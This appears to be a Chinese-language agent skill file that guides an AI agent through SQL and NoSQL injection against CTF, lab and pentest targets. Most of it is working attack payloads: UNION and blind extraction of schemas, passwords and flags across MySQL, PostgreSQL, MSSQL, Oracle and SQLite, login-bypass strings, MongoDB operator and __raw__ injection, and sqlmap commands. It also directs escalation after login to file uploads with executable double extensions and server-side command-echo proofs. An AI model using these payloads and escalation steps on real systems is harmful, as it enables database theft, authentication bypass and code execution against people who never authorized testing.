---
name: sql-injection-skill
description: 面向授权 CTF、靶场和渗透测试的 SQL/NoSQL 注入完整分析 Skill。用于 SQL 错误、引号或括号敏感、认证点异常、数字参数真假差分、搜索/排序/筛选参数异常、UNION 回显、布尔盲注、时间盲注、错误盲注、二阶或二次查询 SQLi、sqlmap 精准验证、MongoDB/NoSQL 操作符注入、MongoEngine __raw__ 查询、JSON 查询注入、regex 盲提取、GraphQL 隐藏字段/API 查询字段进入数据库查询、以及需要从输入点推进到库表字段、凭据、flag、上传面或权限状态变化的场景。
---

# sql-injection-skill

目标是把一个可疑输入点推进成可复现结论：不是 SQL/NoSQL 注入、候选注入、已验证注入，或已拿到目标数据。每次只验证一个变量，先建稳定 oracle，再提取最小目标。

## 工作流

1. 固定基线：记录方法、URL、参数、Cookie、角色、Content-Type、正常状态码、响应长度、关键文本、跳转和耗时。
2. 定位上下文：分别测试 `'`、`"`、`)`、`--`、`#`、`;`、反引号、JSON 类型变化；观察错误、长度、登录态、排序、空结果和延迟。
3. 建立 oracle：使用成对 payload 证明 true/false、error/no-error、delay/no-delay、row/no-row 差分。
4. 判断数据库族：用错误文本、函数、系统变量和语法差异识别 MySQL、SQLite、PostgreSQL、MSSQL、Oracle 或 MongoDB/NoSQL。
5. 选择提取路线：有回显走 UNION；无回显走布尔/错误/时间盲注；登录点优先构造指定用户或可控行；存储后触发则按二阶 SQLi。
6. 提取目标：优先库名、表名、列名、`users/admin/flag/secret`，再取凭据、flag、token、role 或能进入下一阶段的值。
7. 记录证据：每个结论保留一对最小请求和对应响应信号，避免只保留最终 payload。
8. 不要停在“已登录”或“已读字段”：继续检查新权限下的上传、导出、管理面、文件读取、模板渲染和目标数据页面。

## SQL 最小探测

数字型：

```sql
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 OR 1=2
```

字符串型：

```sql
' AND '1'='1
' AND '1'='2
' OR '1'='1
' OR '1'='2
```

括号型：

```sql
) AND (1=1
) AND (1=2
')) OR (('1')=('1
')) OR (('1')=('2
```

时间型：

```sql
AND SLEEP(3)
AND pg_sleep(3)
; WAITFOR DELAY '00:00:03'--
AND randomblob(100000000)
```

错误型：

```sql
AND CASE WHEN 1=1 THEN 1 ELSE 1/0 END
AND CASE WHEN 1=2 THEN 1 ELSE 1/0 END
```

## DBMS 速查

| DBMS | 指纹 | 当前库/用户 | 版本 | 表结构入口 | 延迟 |
| --- | --- | --- | --- | --- | --- |
| MySQL | `connection_id()=connection_id()` | `database()`, `user()` | `version()` | `information_schema.tables`, `information_schema.columns` | `SLEEP(3)` |
| SQLite | `sqlite_version()=sqlite_version()` | 无库名概念 | `sqlite_version()` | `sqlite_master`, `sqlite_schema` | `randomblob(100000000)` |
| PostgreSQL | `5::int=5` | `current_database()`, `current_user` | `version()` | `pg_catalog.pg_tables`, `pg_catalog.pg_class` | `pg_sleep(3)` |
| MSSQL | `@@CONNECTIONS=@@CONNECTIONS` | `DB_NAME()`, `SYSTEM_USER` | `@@version` | `sys.tables`, `sys.columns` | `WAITFOR DELAY` |
| Oracle | `ROWNUM=ROWNUM` | `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')`, `USER` | `v$version` | `all_tables`, `all_tab_columns` | `DBMS_LOCK.SLEEP(3)` |

常用函数差异：

```sql
-- MySQL / SQLite
SUBSTR(x,1,1), LENGTH(x), ASCII(x)

-- PostgreSQL
SUBSTRING(x,1,1), LENGTH(x), ASCII(x)

-- MSSQL
SUBSTRING(x,1,1), LEN(x), ASCII(x)

-- Oracle
SUBSTR(x,1,1), LENGTH(x), ASCII(x)
```

## UNION 路线

先测列数和可显示列：

```sql
ORDER BY 1
ORDER BY 2
UNION SELECT NULL
UNION SELECT NULL,NULL
UNION SELECT 1,2,3
```

再取最小目标：

```sql
-- MySQL
UNION SELECT database(),user(),version()
UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'

-- SQLite
UNION SELECT name,sql,3 FROM sqlite_master

-- PostgreSQL
UNION SELECT current_database(),current_user,version()
UNION SELECT tablename,schemaname,3 FROM pg_catalog.pg_tables

-- MSSQL
UNION SELECT DB_NAME(),SYSTEM_USER,@@version
UNION SELECT name,2,3 FROM sys.tables
```

如果登录逻辑校验本地哈希，UNION 行要匹配应用期望的列数、用户名和哈希格式；先让原查询变空，再 UNION 可控行。

## 盲注路线

布尔盲注：

```sql
AND LENGTH((SELECT database()))=5
AND ASCII(SUBSTR((SELECT database()),1,1))>77
AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97
```

时间盲注：

```sql
-- MySQL
AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)

-- PostgreSQL
AND CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>77 THEN pg_sleep(3) ELSE pg_sleep(0) END IS NULL

-- MSSQL
IF (ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '00:00:03'

-- SQLite
AND CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>77 THEN randomblob(100000000) ELSE 1 END
```

错误盲注：

```sql
-- SQLite
AND CASE WHEN 1=1 THEN 1 ELSE json('') END

-- PostgreSQL
AND CASE WHEN 1=1 THEN 1 ELSE CAST('x' AS int) END=1

-- MySQL
AND IF(1=1,1,extractvalue(1,concat(0x7e,version())))
```

提取时优先二分 ASCII，字符集从 `flag{}`、十六进制、数字字母和常见符号开始。

## 登录、排序和二阶场景

登录点：

```sql
' OR '1'='1'--
' OR '1'='1' LIMIT 1--
admin'--
admin')--
' AND 1=0 UNION SELECT 'admin','<known_hash>'--
```

排序点：

```sql
id
id DESC
(CASE WHEN 1=1 THEN id ELSE title END)
(CASE WHEN SUBSTR((SELECT database()),1,1)='a' THEN id ELSE title END)
```

二阶 SQLi：

1. 在注册、昵称、邮箱、地址、偏好、搜索历史、文件元数据中存 payload。
2. 在 profile、改密、后台列表、导出、报表、通知、搜索历史中触发。
3. 证据必须包含存储请求、触发请求、触发前后差分。

二次查询 SQLi：

1. 如果第一条查询返回的 `username/id/role/email` 会被拼进第二条 SQL，先让第一条查询返回可控值。
2. 用 UNION 构造可控行时，列名和类型要匹配应用读取字段，例如 `username` 必须落在后续拼接使用的列。
3. 登录成功后立即枚举权限变化：上传、管理、资料、导出、下载、目标数据读取等新功能面。
4. 发现上传面时检查文件名、扩展名、Content-Type、魔术字和访问路径；若只做文件名包含判断，测试“双扩展名 + 可执行后缀”的解释器行为。
5. 上传后先验证访问路径和解释器行为，再做最小服务端读文件或命令回显证明；目标路径必须来自运行时证据或常见挑战位置。

## NoSQL 注入

常见入口：JSON 登录体、MongoDB 查询参数、Express/Node API、GraphQL resolver、搜索过滤器、对象条件合并、MongoEngine `filter(**data)`、URL query 被解析为嵌套对象。

识别信号：

- 字符串换成对象后行为改变：`"password":{"$ne":""}`。
- `$ne/$gt/$regex/$in/$where` 出现登录态、结果数量、错误或耗时变化。
- URL 参数支持嵌套：`username[$ne]=x&password[$ne]=x`。
- GraphQL/API 字段影响 Mongo/ORM 查询条件。
- GraphQL schema、错误提示或响应差分暴露隐藏字段，如 `flag`、`secret`、`role`。

认证点验证：

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":""}}
{"username":{"$regex":"^admin$"},"password":{"$gt":""}}
```

URL 编码形式：

```text
username[$ne]=x&password[$ne]=x
username=admin&password[$regex]=.*
```

数据枚举：

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
{"target_field":{"$regex":"^known_prefix"}}
```

MongoEngine / `filter(**data)`：

```json
{"__raw__":{"username":"candidate_user"}}
{"__raw__":{"username":"candidate_user","target_field":{"$exists":true}}}
{"__raw__":{"target_field":{"$regex":"^known_prefix"}}}
```

如果 API 允许选择字段或 GraphQL 查询字段，先请求隐藏字段：

```graphql
{ collection { username email target_field } }
{ search(filter: {"__raw__": {"target_field": {"$exists": true}}}) { username target_field } }
```

布尔差分：

```json
{"$and":[{"username":"admin"},{"password":{"$regex":"^a"}}]}
{"$and":[{"username":"admin"},{"password":{"$regex":"^z"}}]}
```

时间/执行类只在明确允许、且目标使用 Mongo `$where` 或 JavaScript 查询时测试：

```json
{"$where":"sleep(3000)||true"}
{"$where":"this.username=='admin'"}
```

NoSQL 提取策略：

1. 先确认对象操作符是否被后端保留，而不是被当作普通字符串。
2. 用 `$regex` 前缀 oracle 提取用户名、密码哈希、token 或 flag。
3. 用 `$exists` 判断字段存在：`{"flag":{"$exists":true}}`。
4. 用 `$in` 或 `$or` 判断候选用户名：`{"$or":[{"username":"admin"},{"role":"admin"}]}`。
5. 对 MongoEngine，优先测试 `__raw__` 是否穿透到原生 Mongo 查询。
6. 对 GraphQL，先用 introspection、错误建议、前端 bundle 或字段猜测确认隐藏字段，再把字段加入查询结果集。
7. 每次只比较两个请求，记录匹配/不匹配的响应差分。

## sqlmap 精准使用

只在已知可疑参数上使用：

```bash
sqlmap -r request.txt -p username --batch --level=2 --risk=1
sqlmap -r request.txt -p id --batch --dbms=mysql --technique=BEUST
sqlmap -r request.txt -p q --batch --string="true marker"
sqlmap -r request.txt -p q --batch --not-string="false marker"
sqlmap -r request.txt --second-order "http://target/profile" --batch
```

复杂请求中用 `*` 标记注入点。sqlmap 结果只能作为辅助，最终结论仍要保留最小手工请求对。

## 输出格式

```text
entry_point:
input_type:
baseline:
database_guess:
oracle:
true_request:
false_request:
signal:
extracted:
next_step:
status: rejected | candidate | verified | goal_achieved
```

没打通时写具体卡点：入口、已测 payload、稳定信号、未测闭合方式、未测 DBMS、下一条最小探针。不要写泛泛的“SQLi 失败”。
